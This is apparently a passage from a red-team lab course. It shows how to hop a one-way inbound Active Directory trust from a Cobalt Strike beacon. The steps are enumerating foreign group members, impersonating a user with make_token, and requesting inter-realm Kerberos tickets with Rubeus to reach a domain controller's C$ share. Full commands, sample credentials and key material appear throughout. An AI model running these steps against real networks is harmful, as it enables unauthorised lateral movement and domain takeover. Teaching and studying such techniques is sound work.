**dev.cyberbotic.io** has a one-way inbound trust with **subsidiary.external**.

```
beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : subsidiary.external
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
  
Because the trust is inbound from our perspective, it means that principals in our domain can be granted access to resources in the foreign domain. We can enumerate the foreign domain across the trust.

```
beacon> powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName

dnshostname           
-----------           
ad.subsidiary.external
```

>  `SharpHound -c DcOnly -d subsidiary.external` will also work.

`Get-DomainForeignGroupMember` will enumerate any groups that contain users outside of its domain and return its members.

```
beacon> powershell Get-DomainForeignGroupMember -Domain subsidiary.external

GroupDomain             : subsidiary.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external
MemberDomain            : subsidiary.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,
                          DC=external
```

This output shows that there's a member of the domain's built-in Administrators group who is not part of subsidiary.external. The **MemberName** field contains a SID that can be resolved in our current domain.

```
beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\Subsidiary Admins
```

If this is confusing, this is how it looks from the perspective of the subsidiary.external's domain controller.  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/subsidiary-foreign-group-member.png)

`Get-NetLocalGroupMember` can enumerate the local group membership of a machine. This shows that `DEV\Subsidiary Admins` is a member of the local Administrators group on the domain controller.

```
beacon> powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : DEV\Subsidiary Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True
```

This is a slightly contrived example - you may also enumerate where foreign groups and/or users have been assigned local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

To hop the trust, we need to impersonate a member of this domain group. If you can get clear text credentials, `make_token` is the most straight forward method.

```
beacon> powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName

MemberName
----------
jadams

beacon> make_token DEV\jadams TrustNo1
[+] Impersonated DEV\bfarmer

beacon> ls \\ad.subsidiary.external\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     03/11/2021 18:00:26   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 22:51:50   System Volume Information
          dir     02/17/2021 18:50:04   Users
          dir     02/19/2021 22:34:47   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 384mb    fil     03/16/2021 10:48:25   pagefile.sys
```

If you only have the user's RC4/AES keys, we can still request Kerberos tickets with Rubeus but it's more involved. We need an inter-realm key which Rubeus won't produce for us automatically, so we have to do it manually.

First, we need a TGT for the principal in question. This TGT will come from the current domain.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

[*] Action: Ask TGT
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac_sha1 hash: 70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jadams'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFdD [...snip...] MuSU8=

  ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:00:28 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  3/23/2021 1:00:28 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  mnuk66R9/j0cnmZczy8ACxBfn5VcZ5pFubm3tI79KZ4=
```

Next, request a referral ticket from the current domain, for the target domain.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFdD[...snip...]MuSU8= /nowrap

[*] Action: Ask TGS
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/subsidiary.external'
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFMT [...snip...] 5BTA==

  ServiceName           :  krbtgt/SUBSIDIARY.EXTERNAL
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:02:06 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  1/1/0001 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwardable
  KeyType               :  rc4-hmac
  Base64(key)           :  O7B/KR3+DvhlpY6qwrTlHg==
```

  

>  Notice how this inter-realm ticket is of type `rc4_hmac` even though our TGT was `aes256_cts_hmac_sha1`. This is the default configuration unless AES has been specifically configured on the trust, so this is not necessary "bad OPSEC".

Finally, use this inter-realm TGT to request a TGS in the target domain.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:doIFMT[...snip...]5BTA== /nowrap

[*] Action: Ask TGS
[*] Using domain controller: ad.subsidiary.external (10.10.14.55)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/ad.subsidiary.external'
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFsD [...snip...] JuYWw=

  ServiceName           :  cifs/ad.subsidiary.external
  ServiceRealm          :  SUBSIDIARY.EXTERNAL
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:08:52 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  1/1/0001 12:00:00 AM
  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  HPmz324aewyZ6El4LGoVEksQEvkI3eoSiy7gAlgEXbU=
```

  

Write this base64 encoded ticket to a file on your machine.

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("doIFiD [...snip...] 5hbA=="))
```

Create a sacrificial logon session and import the ticket.

```
beacon> make_token DEV\jadams FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Daniel\Desktop\subsidiary.kirbi
beacon> ls \\ad.subsidiary.external\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 10:03:50   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/16/2021 12:15:11   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 22:51:50   System Volume Information
          dir     05/16/2021 11:58:30   Users
          dir     05/16/2021 11:31:57   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     05/25/2021 08:39:47   pagefile.sys

 beacon> rev2self
```

Foreign Principals can also have DACL abuse primitives, where `DEV\Subsidiary Admins` could have abusable DACLs on principals within the `subsidiary.external` domain.